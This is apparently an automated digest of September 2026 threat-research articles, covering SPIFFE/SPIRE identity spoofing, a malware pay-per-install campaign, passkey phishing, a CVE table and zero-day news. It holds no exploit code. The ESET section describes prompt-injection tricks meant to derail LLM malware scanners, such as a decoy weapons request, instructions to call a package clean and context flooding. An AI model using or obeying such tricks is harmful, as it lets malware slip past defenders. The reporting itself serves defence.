ai-security-research 41 Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026
```

#### Corroborating sources (1)

- **Simon Willison** (ai_security_agentic_risk)
  - Title: Quoting Calif Research
  - Published: 2026-09-10T00:56:41+00:00
  - Link: https://simonwillison.net/2026/Sep/10/calif-research/
  - Summary: Today, we're releasing a demo of WeWorm, the first zero-click worm to spread through WeChat calls across iOS and Android. [...] The victim does not need to answer the call, or interact with their phone at all. Even if they do answer, they hear nothing, and the exploit still succeeds. [...] Working with AI, our team found the bug and wrote the first remote code execution (RCE) exploit in about two days. Building the worm took one more week. A worm at this scale used to be the kind of thing that took a larger team months. AI can already do most of the work here. Our team provided the judgment about what to target and how to test it safely. — Calif Research , WeWorm Tags: ai-security-research , ai , llms , security , generative-ai

### Cluster 35d2f86bf7 — score 10

- Title: The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-10T10:00:43+00:00
- Link: https://unit42.paloaltonetworks.com/kubernetes-spiffe-spire-identity-spoofing/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: Kubernetes

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Kubernetes
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Kubernetes
- urgency_signals: actively_exploited
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Learn how root access on a compromised K8s node allows attackers to utilize SPIFFE/SPIRE metadata to spoof and harvest co-located workload identities. The post The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE 11 min read Related Products Cortex Cortex Cloud Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Eviatar Garzi Published: September 10, 2026 Categories: Malware Threat Research Tags: API Cryptographic JSON Linux Node SPIFFE SPIRE Spoofing Share Executive Summary This research demonstrates post-exploitation techniques that could allow an attacker with root access on a compromised Kubernetes node to misuse an open standard and reference implementation for machine identity known as SPIFFE/SPIRE to impersonate co-located workloads and harvest SPIFFE Verifiable Identity Documents (SVIDs). We show how the trust assumption at the core of every machine-identity system — that the node is trusted — collapses once an attacker obtains root on that node. Unit 42 has not observed this technique exploited in the wild. The Secure Production Identity Framework for Everyone (SPIFFE)/the SPIFFE Runtime Environment (SPIRE) is widely deployed in Kubernetes and cloud-native environments to replace long-lived secrets with short-lived, cryptographically verifiable workload identities. Our research shows how an attacker with root can spoof the Linux control group (cgroup) information the SPIRE agent uses during workload attestation. This tricks the agent into issuing a co-located workload's SVID to an attacker-controlled process. As part of this research, we developed Spooffe , an open-source tool that defenders can use to test whether an attacker with administrative access could manipulate cgroup metadata to retrieve co-located workload identities and assess the resulting identity area of impact. When designing threat models for SPIFFE/SPIRE, organizations should assume that root-level access to a node grants access to all cryptographic identities scoped to it. We recommend performing the following activities to reduce exposure: Harden nodes Restrict root access Prohibit privileged containers, host access Minimize reliance on weak selectors Palo Alto Networks customers are better protected from the threats described here through the following products and services: Cortex XDR and XSIAM Cortex Cloud Identity Threat Detection If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics Identity , Cloud , Kubernetes Introduction SPIFFE is an open standard for machine identity designed to solve the “Secret Zero” problem — the challenge of securely introducing the initial secret required to bootstrap trust — by replacing long-lived secrets with short-lived workload identities. When deployed correctly, SPIFFE enforces strong identity boundaries between workloads. However, these guarantees rely on a core assumption shared by all identity systems that the underlying node is trusted. If an attacker gains root access to a node, they can interact with identity mechanisms to retrieve all identities authorized to that compromised node. Our research explores how attackers can exploit root access to harvest workload identities from a compromised node. In this post, we lay the groundwork by explaining machine identity and how SPIFFE establishes and verifies trust in cloud-native environments. We then demonstrate workload impersonation through selector spoofing. Finally, we introduce Spooffe , a tool we built to automate the extraction of these workload identities (SVIDs). Note to readers: If you’re already familiar with SPIFFE/SPIRE concepts and architecture, you can jump directly to Workload Attestation and How the Agent Attests the Workload sections. SPIFFE Overview Consider a scenario where two applications, a frontend and a backend, must communicate securely. We could generate key pairs and exchange public keys to communicate through Mutual Transport Layer Security (mTLS ) , but this option raises a few key questions: Who rotates those keys? Who re
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE
  - Published: 2026-09-10T10:00:43+00:00
  - Link: https://unit42.paloaltonetworks.com/kubernetes-spiffe-spire-identity-spoofing/
  - Summary: Learn how root access on a compromised K8s node allows attackers to utilize SPIFFE/SPIRE metadata to spoof and harvest co-located workload identities. The post The Machine With Many Faces: Post-Exploitation Identity Misuse in SPIFFE/SPIRE appeared first on Unit 42 .

### Cluster 0a6ef11865 — score 10

- Title: Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure
- Source: Unit 42 (threat_research_primary)
- Published: 2026-09-09T10:00:55+00:00
- Link: https://unit42.paloaltonetworks.com/ppi-network-malware-campaign-analysis/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: web_shell_backdoor
- affected_industries: critical_infrastructure, government
- affected_products: Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: web_shell_backdoor
- affected_industries: government, critical_infrastructure
- affected_products: Palo Alto Networks
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
An investigation into how cybercriminals used YouTube gaming lures and SEO poisoning to deliver multi-payload malware to enterprise networks. The post Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure appeared first on Unit 42 .
```

#### Full body

```
Threat Research Center Threat Research Malware Malware Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure 18 min read Related Products Advanced DNS Security Advanced URL Filtering Advanced WildFire Cloud-Delivered Security Services Cortex Cortex XDR Cortex XSIAM Unit 42 Incident Response By: Rem Dudas Published: September 9, 2026 Categories: Malware Threat Research Tags: ARKTunnel C2 CL-CRI-1171 Docro Hijacker Pay-per-install Payload Share Executive Summary A recent Unit 42 investigation into seemingly low-priority enterprise infections demonstrates how the most effective camouflage in cybercrime is not necessarily in the use of sophisticated techniques, but in how unremarkable the threat appears. The activities that we investigated would typically not require escalation or further inquiry. But upon closer inspection, we discovered a massive cybercrime campaign largely targeting young gamers. Tracked as CL-CRI-1171, in accordance with Unit 42’s attribution framework , the group behind this cluster has operated under the radar for at least two years, distributing an indeterminate number of payloads. The group behind CL-CRI-1171 provides an infection service for other threat actors who want to spread their malware indiscriminately. This pay-per-install (PPI) marketplace drove hundreds of infections through YouTube channels and a parallel search engine optimization (SEO)-poisoning funnel, all using the same custom loader. We observed at least eleven YouTube channels that had hundreds of thousands of followers. We notified YouTube of these channels, which it promptly terminated. These channels were actively interacting with viewers to promote gaming content laced with links to download malware. Content in the channels included advice on improving frame rates, fixing game crashes and adjusting settings on game platforms. Although the videos provided real content for gamers, they also served as the delivery vehicle for infection, prompting viewers to download malicious tools. The SEO funnel targeted a more professional audience, promoting trojanized software that resulted in malware deployment on corporate endpoints, including critical infrastructure and even government entities. We identified three independent payloads delivered by the same loader between July 2025 and April 2026: two never publicly reported, Docro Hijacker and ARKTunnel, and a new variant of a previously unnamed backdoor, which we dubbed Insomnia remote access Trojan (RAT). These infections represent only a small sample of a much larger deployment campaign. We have identified more than 10,000 distinct loader samples, each capable of delivering unique payload combinations. We provide an overview of the cybercrime cluster and its loader infrastructure, and a technical analysis of three recently delivered malware strains. Palo Alto Networks customers are better protected from the threats discussed in this article through the following: Advanced WildFire Advanced URL Filtering and Advanced DNS Security Cortex XDR and XSIAM If you think you might have been compromised or have an urgent matter, contact the Unit 42 Incident Response team . Related Unit 42 Topics SEO Poisoning , Browser Hijacking , RATs Overview of CL-CRI-1171 Activity Our discovery of two separate infections delivering three entirely distinct malware families revealed one common denominator: a shared loader. By tracing this infrastructure, we mapped the broader activity of CL-CRI-1171, ultimately tying the cluster to a PPI marketplace responsible for delivering countless payloads over the last two years. This operation uses at least two funneling mechanisms to route traffic to the malware landing pages: a network of YouTube channels and SEO poisoning . The shared infrastructure between the YouTube and SEO funnels, consistent use of the same loader and a rotational domain pattern observed over an eight-month window all pointed to a single sustained operation, which we track as CL-CRI
```

#### Corroborating sources (1)

- **Unit 42** (threat_research_primary)
  - Title: Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure
  - Published: 2026-09-09T10:00:55+00:00
  - Link: https://unit42.paloaltonetworks.com/ppi-network-malware-campaign-analysis/
  - Summary: An investigation into how cybercriminals used YouTube gaming lures and SEO poisoning to deliver multi-payload malware to enterprise networks. The post Untracked Nightmares: The Threats Hiding Behind Commodity Infrastructure appeared first on Unit 42 .

### Cluster ebc72eebc6 — score 10

- Title: Passkey-themed social engineering leads to identity and cloud compromise
- Source: Microsoft Security Blog (threat_research_primary)
- Published: 2026-09-09T17:41:18+00:00
- Link: https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/
- Fetch status: ok
- Member count: 2
- Corroborating source count: 2
- Strong signals: Microsoft SharePoint

#### Cluster taxonomy (union across members)
- threat_categories: mfa_bypass, phishing_social_eng
- affected_products: Microsoft Defender, Microsoft SharePoint
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, mfa_bypass
- affected_products: Microsoft SharePoint, Microsoft Defender
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
Passkey-themed social engineering is being used to compromise identities and enable broader cloud attacks. Learn how threat actors establish MFA persistence, abuse Microsoft Graph for reconnaissance, and access SharePoint, OneDrive, and email data, along with key detection and mitigation guidance. The post Passkey-themed social engineering leads to identity and cloud compromise appeared first on Microsoft Security Blog .
```

#### Full body

```
Share Link copied to clipboard! Tags Social engineering Content types Research Products and services Microsoft Defender Microsoft Defender Experts Topics Actionable threat insights Threat intelligence Microsoft Security Research is tracking active cloud-based intrusions spanning multiple accounts in which unusual sign-ins were followed by threat actor-added authentication methods, high-volume Microsoft Graph activity, SharePoint and OneDrive downloads, and email collection through REST APIs. Microsoft Security Research assesses that this sequence is consistent with automated collection from compromised cloud identities using proxy-associated infrastructure, the activity has been observed since May 2026. The activity begins with identity-focused social engineering and impersonation infrastructure, proceeds through authentication persistence and cloud reconnaissance, and is followed by targeted data access and activity consistent with data collection and potential exfiltration. Domains, IP addresses, and hosting providers can change quickly, but the recurring sequence of identity compromise, persistence, reconnaissance, content discovery, and exfiltration provides a more durable basis for investigation. Defenders should investigate this sequence across identity, Microsoft Graph, SharePoint, OneDrive, and Exchange signals, then revoke sessions and remove unauthorized authentication methods for confirmed compromises. Attack chain overview Figure 1. Observed attack sequence showing identity compromise through social engineering, MFA persistence, Microsoft Graph reconnaissance, and cloud data collection/exfiltration. Step 1-2 : Initial access: Passkey and SSO lures The attack often begins with a seemingly routine call or message on a user’s personal phone number from someone claiming to be from the organization’s IT helpdesk. The caller creates a sense of urgency, explaining that a passkey, multifactor authentication (MFA), or single sign-on (SSO) configuration must be updated immediately to avoid disruption. Employees are directed to a website that closely resembles a legitimate Microsoft sign-in experience and may receive the link through SMS messages sent directly to their personal mobile phones. Despite the frequent use of passkey-themed lures, passkey enrollment is often not the actor’s true objective. Instead, the passkey narrative serves as a convincing pretext to guide victims through adversary-in-the-middle (AiTM) phishing or device-code authentication flows. In AiTM scenarios, the actor captures credentials and session tokens; in device code attacks, the victim unknowingly authorizes access on the actor’s behalf. This initial interaction may leave very little forensic evidence. If the victim opens the phishing link on a personal mobile device that is not onboarded to Microsoft Defender for Endpoint, the related activity may be absent from endpoint telemetry. In many investigations, the employee’s recollection of a phone call or text message becomes the earliest and sometimes the only evidence explaining how the compromise began. As a result, investigators must often reconstruct the attack by connecting these reports with subsequent sign-ins, device code authentication events, token activity, and authentication method changes. Reconnaissance on targeted organization The actor appears to invest heavily in pre-attack research, likely gathering information about employees and organizational structure from public sources such as social networking and professional profiling platforms. Reusable domains, personalized targeting In a smaller number of cases, actors take advantage of already compromised accounts to expand their reach. Using a trusted employee identity, they send similar passkey-themed messages through Microsoft Teams, making the request appear legitimate and significantly increasing the likelihood of engagement. To support these operations, the actors rapidly deploy convincing phishing infrastructure built around the
```

#### Corroborating sources (2)

- **Microsoft Security Blog** (threat_research_primary)
  - Title: Passkey-themed social engineering leads to identity and cloud compromise
  - Published: 2026-09-09T17:41:18+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/
  - Summary: Passkey-themed social engineering is being used to compromise identities and enable broader cloud attacks. Learn how threat actors establish MFA persistence, abuse Microsoft Graph for reconnaissance, and access SharePoint, OneDrive, and email data, along with key detection and mitigation guidance. The post Passkey-themed social engineering leads to identity and cloud compromise appeared first on Microsoft Security Blog .
- **Microsoft Threat Intelligence** (threat_research_primary)
  - Title: Passkey-themed social engineering leads to identity and cloud compromise
  - Published: 2026-09-09T17:41:18+00:00
  - Link: https://www.microsoft.com/en-us/security/blog/2026/09/09/passkey-themed-social-engineering-leads-identity-cloud-compromise/
  - Summary: Passkey-themed social engineering is being used to compromise identities and enable broader cloud attacks. Learn how threat actors establish MFA persistence, abuse Microsoft Graph for reconnaissance, and access SharePoint, OneDrive, and email data, along with key detection and mitigation guidance. The post Passkey-themed social engineering leads to identity and cloud compromise appeared first on Microsoft Security Blog .

### Cluster 22339b9409 — score 10

- Title: 7th September – Threat Intelligence Report
- Source: Check Point Research (threat_research_primary)
- Published: 2026-09-07T14:54:29+00:00
- Link: https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: data_breach, ransomware_extortion, zero_day
- affected_industries: healthcare, manufacturing_industrial
- affected_products: Anthropic/Claude, Microsoft Windows, SonicWall
- cve_ids: CVE-2026-82329, CVE-2026-83548, CVE-2026-83549
- urgency_signals: critical_cvss, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, data_breach
- affected_industries: healthcare, manufacturing_industrial
- affected_products: SonicWall, Microsoft Windows, Anthropic/Claude
- cve_ids: CVE-2026-83548, CVE-2026-83549, CVE-2026-82329
- urgency_signals: zero_day, preauth_unauth, critical_cvss
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files […] The post 7th September – Threat Intelligence Report appeared first on Check Point Research .
```

#### Full body

```
FILTER BY YEAR 2026 2025 2024 2023 2022 2021 2020 2019 2018 2017 2016 7th September – Threat Intelligence Report September 7, 2026 https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/ For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files containing court records, including names and other personal information. Hit, a major Slovenian gambling and tourism operator, has sustained a cyberattack that forced six casinos to close for about three days. Operations have resumed, but some table games, bingo, loyalty services, cash registers, and hotel systems remained unavailable during restoration, while some employees were temporarily furloughed. Baylor Genetics, a US clinical diagnostic laboratory, has disclosed a data breach affecting 2.8M patients and employees after unauthorized access to part of its IT environment in June. Stolen data included names, birth dates, medical testing and laboratory results, health insurance information, and some Social Security numbers. Global cloud storage provider Dropbox has disclosed unauthorized access to about 5,000 accounts after attackers exploited Lenovo’s email verification process. Fraudulent Lenovo IDs created with victims’ email addresses enabled access without Dropbox passwords, while files were viewed or downloaded from affected accounts. AI THREATS Researchers have detailed an AI-assisted ransomware intrusion that compromised an enterprise network in under 10 hours. Autonomous agents mapped internal systems, mined code repositories, obtained root credentials from a secrets manager, and abused build pipelines and cloud resources, compressing activity that normally requires substantially more human effort. Security researchers have disclosed GitSpawn, a vulnerability class affecting AI coding agents including Claude Code, Codex, Cursor, Goose, Qwen Code, Grok Build, and Hermes. Malicious repository Git configurations can trigger arbitrary code execution as the developer when agents automatically gather project context, in some cases before trust prompts. Researchers have showcased how an AI coding assistant can be used to port a known PLC exploit to a different controller model, producing working payloads after guided analysis. While the process still required significant manual effort, it demonstrated how AI can accelerate exploit development for industrial systems. VULNERABILITIES AND PATCHES SonicWall has addressed CVE-2026-83548 and CVE-2026-83549, critical vulnerabilities affecting SMA 1000 remote access gateways. CVE-2026-83548 is a pre-authentication SSRF flaw rated CVSS 10.0, while CVE-2026-83549 enables post-authentication remote code execution. Both were exploited as zero-days and affect SMA 6210, 7210, and 8200v appliances. JFrog has addressed CVE-2026-82329, a critical CVSS 9.8 authentication bypass affecting self-hosted Artifactory deployments. The flaw allows unauthenticated attackers to obtain administrator access tokens and take control of repositories. Exploitation was observed shortly after disclosure against internet-exposed systems, while JFrog Cloud environments were patched by the vendor. Check Point IPS provides protection against this threat (JFrog Artifactory Authentication Bypass (CVE-2026-82329)) Security researcher have unveiled FalconFlank, a zero-day privilege escalation technique affecting CrowdStrike Falcon on Windows 11 25H2 and Windows Server 2025. The proof-of-concept abuses Falcon’s Microsoft Office macro-removal remediation behavior, allowing a low-privileged local user to obtain elevated access on affected systems THREAT INTELLIGENCE REPORTS Check Point Research has uncovered a Chinese-speaking cybercrime clus
```

#### Corroborating sources (1)

- **Check Point Research** (threat_research_primary)
  - Title: 7th September – Threat Intelligence Report
  - Published: 2026-09-07T14:54:29+00:00
  - Link: https://research.checkpoint.com/2026/7th-september-threat-intelligence-report/
  - Summary: For the latest discoveries in cyber research for the week of 7th Setpember, please download our Threat Intelligence Bulletin. TOP ATTACKS AND BREACHES Thomson Reuters, a global information and technology company, has disclosed a breach of its C-Track court case-management platform affecting courts across 11 US states and Canada. An unauthorized party obtained C-Track files […] The post 7th September – Threat Intelligence Report appeared first on Check Point Research .

### Cluster 0da7e969e0 — score 10

- Title: GuardBreaker: Derailing AI-assisted malware analysis with a code comment
- Source: ESET WeLiveSecurity (threat_research_primary)
- Published: 2026-09-10T09:00:00+00:00
- Link: https://www.welivesecurity.com/en/business-security/guardbreaker-derailing-ai-assisted-malware-analysis-code-comment/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: ai_security, supply_chain
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: supply_chain, ai_security
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
LLM-based code scanners won’t help attackers build a nuclear weapon, but that refusal could work in their favor
```

#### Full body

```
Business Security GuardBreaker: Derailing AI-assisted malware analysis with a code comment LLM-based code scanners won’t help attackers build a nuclear weapon, but that refusal could work in their favor Tomáš Foltýn 10 Sep 2026 • , 4 min. read Malware developers have long adapted their code and tactics to the defenses and scrutiny that are likely to stand in their way. Using various evasion and anti-analysis methods, they routinely attempt to hinder code analysis or prevent their malware from revealing its true behavior while under inspection. Other tools – notably, EDR killers, documented extensively by ESET researchers – go straight after security solutions themselves. As LLM-based tools increasingly assist with various security tasks, including code triage and analysis, it was only a matter of time before threat actors began to look for practical ways to subvert them, too. Alongside conventional evasion techniques, some are taking a different tack: the adversarial input that’s intended to frustrate analysis is left in plain sight. ESET researchers recently spotted one such attempt in a VBScript that the Russia-aligned group UAC-0099 used in the early stages of an attack against a target in Ukraine . By inserting a decoy request for guidance on building a nuclear weapon into the script’s comment, the bad actor aimed to trip the safety guardrails of an LLM-powered code scanner and cause it to stop inspecting the rest of the file – before ever reaching the malicious code. The script’s purpose was to download and install MATCHBOIL, a loader used exclusively by this group to deliver additional payloads. This simple technique, which ESET has named GuardBreaker, relies on precisely the kind of ‘request’ that LLM models are known to decline: GuardBreaker’s guardrail-triggering comment (source: ESET Research ) Unlike many other tricks in attackers’ evasion playbooks, this decoy comment is there for ‘everyone’ – especially for the models analyzing the code – to see. In addition, it has no effect on the script’s behavior at runtime, of course. Nonetheless, its presence suggests that UAC-0099 was accounting for an AI system in the target’s defenses – just as in other recent attacks the group also checked for processes associated with established analysis tools such as IDA and Wireshark. Anti-analysis takes aim at another target GuardBreaker is best understood as a very simple attempt at prompt injection : an attacker’s input reaches the LLM at inference time through a file that’s being analyzed. That way, it aims to exploit an architectural weakness in today’s LLMs, which process untrusted content and trusted instructions without dependable boundaries between the two. Similar attempts to interfere with LLM-powered scanners have surfaced especially in software supply-chain attacks. For example, Socket found fabricated system instructions and policy-triggering content placed ahead of a JavaScript payload in malicious PyPI packages. Reporting on the same broader campaign, StepSecurity found a prompt that flat-out instructed any analyzing model that parsed the file to disregard the malicious code and report the package as clean. In another incident, researchers spotted an npm package whose main JavaScript file repeated “You’re absolutely right!” tens of thousands of times in the hopes of exhausting the model’s context window and putting the malicious script that followed beyond practical analysis. Attackers could attempt to blind the analysis pipeline to malware through other trivial tricks, or even their combinations: unusual or awkwardly structured files could end up being truncated or parsed only in part. Some parts of the malicious code could be concealed under the pretense of being confidential information or other sensitive data. Other attacks could deploy custom file types that would require attackers’ tools to process, whereas others still could steer AI agents towards actions that require human review, thus causing delays exploiti
```

#### Corroborating sources (1)

- **ESET WeLiveSecurity** (threat_research_primary)
  - Title: GuardBreaker: Derailing AI-assisted malware analysis with a code comment
  - Published: 2026-09-10T09:00:00+00:00
  - Link: https://www.welivesecurity.com/en/business-security/guardbreaker-derailing-ai-assisted-malware-analysis-code-comment/
  - Summary: LLM-based code scanners won’t help attackers build a nuclear weapon, but that refusal could work in their favor

### Cluster 5c29932a73 — score 10

- Title: August 2026 CVE Landscape
- Source: Recorded Future (threat_research_primary)
- Published: 2026-09-08T00:00:00+00:00
- Link: https://www.recordedfuture.com/blog/august-2026-cve-landscape
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation
- affected_products: Apple iOS/macOS, Cisco, Gitea
- cve_ids: CVE-2025-62593, CVE-2026-3395, CVE-2026-59800, CVE-2026-72898, CVE-2026-9198
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: active_exploitation
- affected_products: Gitea, Cisco, Apple iOS/macOS
- cve_ids: CVE-2025-62593, CVE-2026-72898, CVE-2026-9198, CVE-2026-3395, CVE-2026-59800
- urgency_signals: actively_exploited, poc_available
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
In August 2026, Insikt Group® identified 73 high-impact vulnerabilities that should be prioritized for remediation, 43 of which had a Very Critical Recorded Future Risk Score. This represents a 14% decrease from last month.
```

#### Full body

```
August 2026 CVE Landscape In August 2026, Insikt Group® identified 73 high-impact vulnerabilities that should be prioritized for remediation , 43 of which had a Very Critical Recorded Future Risk Score. This represents a 14% decrease from last month. 31 of these vulnerabilities were surfaced through the US Cybersecurity and Infrastructure Security Agency (CISA)’s Known Exploited Vulnerabilities (KEV) catalog, 32 were reported in open sources and validated by Insikt Group, seven were sourced through security vendor telemetry, and three were exclusively surfaced through honeypot data. The 73 vulnerabilities in this blog affected products from 45 vendors, with Microsoft accounting for approximately 11% of the vulnerabilities. The remaining exposure spanned remote monitoring and management, virtualization, application delivery, collaboration, artificial intelligence, developer, analytics, identity, operational technology, content management, network edge, video surveillance, and endpoint technologies. In August, Insikt Group created Nuclei templates to detect CVE-2025-62593 (Ray), CVE-2026-72898 (Metabase), and CVE-2026-9198 (IBM Langflow). Each of these vulnerabilities is featured in this blog. Additionally, Insikt Group had previously created templates to detect CVE-2026-3395 (MaxSite CMS) and CVE-2026-59800 (decolua 9Router), but their exploitation was reported in July, so they are not listed in the August 2026 Vulnerability Table. Additionally, Insikt Group created a Nuclei template to detect GitHub Issue #4255 affecting Apache Log4j, a deserialization allowlist bypass that Apache classified as a hardening gap rather than a Log4j vulnerability; as such, it was not assigned a CVE. These Nuclei templates are available to customers via the Recorded Future Intelligence Platform. Quick reference: August 2026 vulnerability table All 70 vulnerabilities below were actively exploited or operationally weaponized in August 2026. This table does not include the three CVEs that were primarily surfaced through honeypot data, which are available to Recorded Future Intelligence Platform customers via the CVE Monthly report. The table below also provides examples of public PoCs identified by Insikt Group. These PoCs were not tested for accuracy or efficacy. Vulnerability management teams should exercise caution and verify the validity of PoCs before testing. # Vulnerability Risk Score Vendor/Product KEV RCE PoC 1 CVE-2026-81578 99 PaperCut NG/MF ✓ Link ✓ 2 CVE-2026-82078 99 PaperCut NG/MF ✓ ✓ Link ✓ 3 CVE-2015-3246 99 Red Hat Libuser ✓ Link ✓ 4 CVE-2015-5287 99 Red Hat Automatic Bug Reporting Tool ✓ Link ✓ 5 CVE-2017-0199 99 Microsoft Office and WordPad ✓ Link ✓ 6 CVE-2017-5753 99 Intel Link ✓ 7 CVE-2019-1068 99 Microsoft SQL Server ✓ ✓ Link ✓ 8 CVE-2019-18935 99 Progress Telerik UI for ASP.NET AJAX ✓ Link ✓ 9 CVE-2020-0796 99 Microsoft Windows 10 and Windows Server ✓ Link ✓ 10 CVE-2020-1472 99 Microsoft Windows Server Link ✓ 11 CVE-2021-23758 99 Ajax.NET Professional ✓ ✓ Link ✓ 12 CVE-2021-3156 99 sudo Link ✓ 13 CVE-2022-0847 99 Linux kernel Link ✓ 14 CVE-2022-0995 99 Linux kernel ✓ Link ✓ 15 CVE-2023-49105 99 ownCloud ✓ 16 CVE-2025-62593 99 Ray-Project Ray ✓ ✓ Link ✓ 17 CVE-2026-18556 99 N-able N-central ✓ 18 CVE-2026-18577 99 N-able N-central ✓ 19 CVE-2026-20349 99 Cisco Secure Firewall Adaptive Security Appliance (ASA) and Secure Firewall Threat Defense (FTD) ✓ 20 CVE-2026-21962 99 Oracle HTTP Server and Oracle WebLogic Server Proxy Plug-in ✓ 21 CVE-2026-33824 99 Microsoft Internet Key Exchange (IKE) Service Extensions ✓ ✓ 22 CVE-2026-34486 99 Apache Tomcat ✓ Link ✓ 23 CVE-2026-39987 99 Marimo ✓ Link ✓ 24 CVE-2026-53362 99 Linux kernel ✓ 25 CVE-2026-55040 99 Microsoft SharePoint ✓ Link ✓ 26 CVE-2026-59310 99 Broadcom VMware vCenter ✓ ✓ Link ✓ 27 CVE-2026-60004 99 Gitea ✓ ✓ Link ✓ 28 CVE-2026-63030 99 WordPress ✓ Link ✓ 29 CVE-2026-63077 99 JetBrains TeamCity ✓ ✓ 30 CVE-2026-64849 99 MLflow ✓ Link ✓ 31 CVE-2026-65400 99 Apple macOS ✓ Link ✓
```

#### Corroborating sources (1)

- **Recorded Future** (threat_research_primary)
  - Title: August 2026 CVE Landscape
  - Published: 2026-09-08T00:00:00+00:00
  - Link: https://www.recordedfuture.com/blog/august-2026-cve-landscape
  - Summary: In August 2026, Insikt Group® identified 73 high-impact vulnerabilities that should be prioritized for remediation, 43 of which had a Very Critical Recorded Future Risk Score. This represents a 14% decrease from last month.

### Cluster 44179b1aeb — score 10

- Title: Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows
- Source: Volexity (threat_research_primary)
- Published: 2026-09-09T17:36:22+00:00
- Link: https://www.volexity.com/blog/2026/09/09/mind-the-patch-gap-multiple-chinese-threat-actors-chain-0-day-exploits-in-chrome-windows/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, web_shell_backdoor, zero_day
- actor_attribution: APT31
- affected_industries: education, financial_services, government
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85046, CVE-2026-85880, CVE-2026-87491
- urgency_signals: no_patch_yet, zero_day
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Primary article taxonomy
- threat_categories: phishing_social_eng, zero_day, web_shell_backdoor
- actor_attribution: APT31
- affected_industries: financial_services, government, education
- affected_products: Microsoft Windows
- cve_ids: CVE-2026-85046, CVE-2026-87491, CVE-2026-85880
- urgency_signals: zero_day, no_patch_yet
- content_type: news_report
- confidence_tier: tier_1_primary_research

#### Summary

```
On September 1, 2026, Volexity’s Network Security Monitoring (NSM) service detected a spear-phishing campaign from a Chinese threat actor it tracks as UTA0560 targeting customers at multiple non-governmental organizations (NGOs). […] The post Mind the (Patch) Gap: Multiple Chinese Threat Actors Chain 0-day Exploits in Chrome & Windows appeared first on Volexity .
```

#### Full body

```
